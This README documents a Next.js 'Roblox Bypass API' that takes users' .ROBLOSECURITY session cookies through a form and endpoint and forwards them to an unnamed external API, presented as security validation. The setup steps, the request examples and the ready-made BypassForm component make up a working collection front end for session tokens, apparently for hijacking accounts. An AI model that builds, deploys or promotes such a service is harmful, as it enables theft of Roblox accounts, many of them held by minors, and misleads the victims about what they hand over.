# ImHellAMo - Roblox Bypass API

A Next.js backend API for Roblox security token validation with CSRF protection and request logging.

## Features

✅ **CSRF Protection** - Secure token generation and validation  
✅ **Request Logging** - All requests stored locally with timestamps  
✅ **Error Handling** - Comprehensive error messages and logging  
✅ **Type Safety** - Full TypeScript support with Zod validation  
✅ **Security** - HTTP-only cookies, strict SameSite policy  
✅ **Timeout Protection** - 30-second request timeout to external API  

## API Endpoints

### GET `/api/bypass`

Retrieve a CSRF token for subsequent requests.

**Response:**
```json
{
  "csrfToken": "a1b2c3d4e5f6..."
}
```

### POST `/api/bypass`

Submit a Roblox `.ROBLOSECURITY` cookie for bypass processing.

**Headers:**
- `Content-Type: application/json`
- `x-csrf-token: <token from GET request>`

**Request Body:**
```json
{
  "cookie": ".ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS..."
}
```

**Success Response (200):**
```json
{
  "success": true,
  "data": { /* external API response */ },
  "requestId": "abc123def456"
}
```

**Error Response (400/403/500):**
```json
{
  "success": false,
  "message": "Error description",
  "error": "Specific error details",
  "requestId": "abc123def456"
}
```

## Setup

### 1. Environment Variables

Copy `.env.example` to `.env.local`:
```bash
cp .env.example .env.local
```

Edit `.env.local` with your configuration:
```
NEXT_PUBLIC_APP_URL=http://localhost:3000
```

### 2. Install Dependencies

```bash
npm install
# or
yarn install
# or
pnpm install
```

### 3. Run Development Server

```bash
npm run dev
```

Server will be available at `http://localhost:3000`

## Usage

### Client-Side Hook

```typescript
import { useBypass } from "@/hooks/use-bypass";

export function MyComponent() {
  const { submit, loading, error } = useBypass({
    onSuccess: (data) => console.log("Success:", data),
    onError: (error) => console.error("Error:", error),
  });

  const handleBypass = async (cookie: string) => {
    const result = await submit(cookie);
    if (result) {
      console.log("Bypass successful:", result.data);
    }
  };

  return (
    <button onClick={() => handleBypass(cookieValue)} disabled={loading}>
      {loading ? "Processing..." : "Submit"}
    </button>
  );
}
```

### Component Usage

```typescript
import { BypassForm } from "@/components/bypass-form";

export default function Page() {
  return (
    <main>
      <BypassForm />
    </main>
  );
}
```

## Project Structure

```
├── app/
│   └── api/
│       └── bypass/
│           └── route.ts          # API endpoints
├── components/
│   └── bypass-form.tsx           # Example form component
├── hooks/
│   └── use-bypass.ts             # React hook for API interaction
├── lib/
│   ├── csrf.ts                   # CSRF token utilities
│   ├── schema.ts                 # Zod validation schemas
│   └── storage.ts                # Local file storage
└── .data/                        # Request logs (auto-created)
```

## Security Considerations

⚠️ **Never share `.ROBLOSECURITY` tokens publicly**  
⚠️ **CSRF tokens are HTTP-only and sameSite="strict"**  
⚠️ **All requests are logged with IP addresses**  
⚠️ **External API calls have 30-second timeout**  

## Request Logging

All bypass requests are automatically stored in the `.data/` directory:
- Request ID, timestamp, status
- Cookie hash (not stored raw for security)
- External API response data
- Error information if applicable

## Troubleshooting

### "Invalid CSRF token"
- Make sure to call GET `/api/bypass` first to get a token
- Include the token in the `x-csrf-token` header for POST requests
- Check that cookies are enabled in your browser

### "Failed to reach external API"
- Verify external API URL is correct and accessible
- Check network connectivity and firewall rules
- Requests have a 30-second timeout

### "Invalid JSON in request body"
- Ensure your request body is valid JSON
- Cookie must be a non-empty string
- Use the `useBypass` hook for automatic validation

## License

MIT

## Support

For issues or questions, open an issue on GitHub.
